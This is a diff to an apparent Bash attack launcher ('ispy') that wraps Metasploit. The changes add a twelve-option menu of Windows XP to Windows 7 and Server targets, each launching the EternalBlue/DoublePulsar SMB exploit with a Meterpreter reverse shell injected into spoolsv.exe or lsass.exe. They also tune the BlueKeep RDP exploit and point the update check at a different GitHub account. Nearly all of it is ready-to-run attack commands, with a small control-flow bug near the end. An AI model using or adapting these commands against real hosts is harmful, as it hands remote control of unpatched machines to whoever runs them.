@@ -20,6 +20,25 @@ n5="5"
 n6="6"
 n7="7"
 n8="8"
+n9="9"
+n10="10"
+n11="11"
+n12="12"
+n13="13"
+bit32="x86"
+bit64="x64"
+os1="Windows XP (all services pack)"
+os2="Windows XP (all services pack)"
+os3="Windows Server 2003 SP0"
+os4="Windows Server 2003 SP1/SP2"
+os5="Windows Server 2003"
+os6="Windows Vista"
+os7="Windows Vista"
+os8="Windows Server 2008"
+os9="Windows Server 2008 R2"
+os10="Windows Server 2008 R2"
+os11="Windows 7 (all services pack)"
+os12="Windows 7 (all services pack)"
 b="bluekeep"
 e="eternalblue"
 dp="doublepulsar"
@@ -29,7 +48,7 @@ n="n"
 pack1="win7/winserver2008 x64"
 pack2="winVista/winXP/win2000/winserver2003"
 pack3="win8/win8.1/win10/winserver2012 x64"
-pack4="win7 x86"
+pack4="winXP_all/winserver2003_all/win7 x86/64/winserver2008,2008R2 x86/64"
 shell="$:"
 en="Enter"
 iface=$(ip -o -4 route show to default | awk '{print $5}')
@@ -109,7 +128,7 @@ back
 
 function update(){
 echo -e "$white[$green+$white]$blue Current ispy version is$white :$red"
-curl -s "https://raw.githubusercontent.com/Cyb0r9/ispy/master/version.txt"| grep 1.0
+curl -s "https://raw.githubusercontent.com/getdrive/ispy/master/version.txt"| grep 1.0
 if [[ $? = 0 ]]; then
 echo -e "$white[$green+$white]$blue ispy already updated$nc"
 else
@@ -213,13 +232,156 @@ exploit ;"
 elif [[ $ch2 == "4" ]]; then
 echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t4
+
+echo -e "$white[$green$n1$white]  use $yellow($green$os1$yellow:$red$bit32$yellow)$nc"
+echo -e "$white[$green$n2$white]  use $yellow($green$os2$yellow:$red$bit64$yellow)$nc"
+echo -e "$white[$green$n3$white]  use $yellow($green$os3$yellow:$red$bit32$yellow)$nc"
+echo -e "$white[$green$n4$white]  use $yellow($green$os4$yellow:$red$bit32$yellow)$nc"
+echo -e "$white[$green$n5$white]  use $yellow($green$os5$yellow:$red$bit64$yellow)$nc"
+echo -e "$white[$green$n6$white]  use $yellow($green$os6$yellow:$red$bit32$yellow)$nc"
+echo -e "$white[$green$n7$white]  use $yellow($green$os7$yellow:$red$bit64$yellow)$nc"
+echo -e "$white[$green$n8$white]  use $yellow($green$os8$yellow:$red$bit32$yellow)$nc"
+echo -e "$white[$green$n9$white]  use $yellow($green$os9$yellow:$red$bit32$yellow)$nc"
+echo -e "$white[$green$n10$white] use $yellow($green$os10$yellow:$red$bit64$yellow)$nc"
+echo -e "$white[$green$n11$white] use $yellow($green$os11$yellow:$red$bit32$yellow)$nc"
+echo -e "$white[$green$n12$white] use $yellow($green$os12$yellow:$red$bit64$yellow)$nc\n"
+
+read -p "$(echo -e $red$shell $nc)" ch
+if [[ $ch == "1" ]]; then
+echo ""
 msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
 set payload windows/meterpreter/reverse_tcp;
 set lhost $loc_ip;
 set rhost $t4;
+set targetarchitecture x86;
+set processinject spoolsv.exe;
+set target 0;
+exploit; "
+
+elif [[ $ch == "2" ]]; then
+echo ""
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
+set payload windows/x64/meterpreter/reverse_tcp;
+set lhost $loc_ip;
+set rhost $t4;
+set targetarchitecture x64;
+set processinject lsass.exe;
+set target 0;
+exploit; "
+
+elif [[ $ch == "3" ]]; then
+echo ""
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
+set payload windows/meterpreter/reverse_tcp;
+set lhost $loc_ip;
+set rhost $t4;
+set targetarchitecture x86;
+set processinject spoolsv.exe;
+set target 1;
+exploit; "
+
+elif [[ $ch == "4" ]]; then
+echo ""
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
+set payload windows/meterpreter/reverse_tcp;
+set lhost $loc_ip;
+set rhost $t4;
+set targetarchitecture x86;
+set processinject spoolsv.exe;
+set target 2;
+exploit; "
+
+elif [[ $ch == "5" ]]; then
+echo ""
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
+set payload windows/x64/meterpreter/reverse_tcp;
+set lhost $loc_ip;
+set rhost $t4;
+set targetarchitecture x64;
+set processinject lsass.exe;
+set target 3;
+exploit; "
+
+elif [[ $ch == "6" ]]; then
+echo ""
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
+set payload windows/meterpreter/reverse_tcp;
+set lhost $loc_ip;
+set rhost $t4;
+set targetarchitecture x86;
+set processinject spoolsv.exe;
+set target 4;
+exploit; "
+
+elif [[ $ch == "7" ]]; then
+echo ""
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
+set payload windows/x64/meterpreter/reverse_tcp;
+set lhost $loc_ip;
+set rhost $t4;
+set targetarchitecture x64;
+set processinject lsass.exe;
+set target 5;
+exploit; "
+
+elif [[ $ch == "8" ]]; then
+echo ""
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
+set payload windows/meterpreter/reverse_tcp;
+set lhost $loc_ip;
+set rhost $t4;
+set targetarchitecture x86;
+set processinject spoolsv.exe;
+set target 6;
+exploit; "
+
+elif [[ $ch == "9" ]]; then
+echo ""
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
+set payload windows/meterpreter/reverse_tcp;
+set lhost $loc_ip;
+set rhost $t4;
+set targetarchitecture x86;
+set processinject spoolsv.exe;
+set target 7;
+exploit; "
+
+
+elif [[ $ch == "10" ]]; then
+echo ""
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
+set payload windows/x64/meterpreter/reverse_tcp;
+set lhost $loc_ip;
+set rhost $t4;
+set targetarchitecture x64;
+set processinject lsass.exe;
+set target 7;
+exploit; "
+
+elif [[ $ch == "11" ]]; then
+echo ""
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
+set payload windows/meterpreter/reverse_tcp;
+set lhost $loc_ip;
+set rhost $t4;
+set targetarchitecture x86;
 set processinject spoolsv.exe;
 set target 8;
-exploit	;"
+exploit; "
+
+elif [[ $ch == "12" ]]; then
+echo ""
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
+set payload windows/x64/meterpreter/reverse_tcp;
+set lhost $loc_ip;
+set rhost $t4;
+set targetarchitecture x64;
+set processinject lsass.exe;
+set target 8;
+exploit; "
+
+echo -e "$white[$green!$white] Invalid Option.$nc"
+fi
 
 elif [[ $ch2 == "5" ]]; then
 echo ""
@@ -228,7 +390,7 @@ msfdb reinit && echo "Waiting..." && msfconsole -q -x " use windows/rdp/cve_2019
 set payload windows/x64/meterpreter/reverse_tcp;
 set lhost $loc_ip;
 set rhost $t5;
-set groomsize 50;
+set groomsize 100;
 set target 1;
 exploit	;"
 
